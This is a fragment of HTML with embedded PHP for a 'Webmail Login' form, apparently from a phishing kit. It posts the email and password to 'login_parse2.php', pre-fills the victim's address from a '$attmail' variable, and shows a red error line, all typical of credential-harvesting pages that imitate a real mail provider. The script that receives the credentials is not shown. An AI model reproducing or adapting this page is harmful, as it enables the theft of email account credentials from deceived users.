            ...
            <div class="sheet">
              <div class="sheet__section">
                <div class="sheet__block"><h1 class="headline" data-i18n="oao.login.heading" data-i18n-attr="text">Webmail Login</h1>
                  <form id="login-form" class="form content-elem" action="login_parse2.php"  method="post" autocomplete="on">
                    <legend class="hidden" data-i18n="oao.login.heading" data-i18n-attr="text">Webmail Login</legend>  <p style="color: red">
                    ...
                    <span class="input-text-group input-text-group--empty" style="overflow: visible; margin-bottom: 10px;">
                      ...
                      <input class="input-text login-form-user" id="login-form-user" maxlength="200" name="user" size="40" tabindex="1" autocapitalize="none" spellcheck="false" type="text" required="true" value="<?php echo $attmail; ?>">
                      <label class="label login-form-user-label" for="login-form-user">
                        <span data-i18n="oao.login.field.email" data-i18n-attr="text">E-mail Address</span></label></span>
                    ...
                    <input class="input-text login-form-password" id="login-form-password" maxlength="40" name="pass" size="40" tabindex="2" type="password" required="true" value=""><label class="label login-form-password-label" for="login-form-password"><span data-i18n="oao.login.field.password" data-i18n-attr="text">Password</span></label></span>
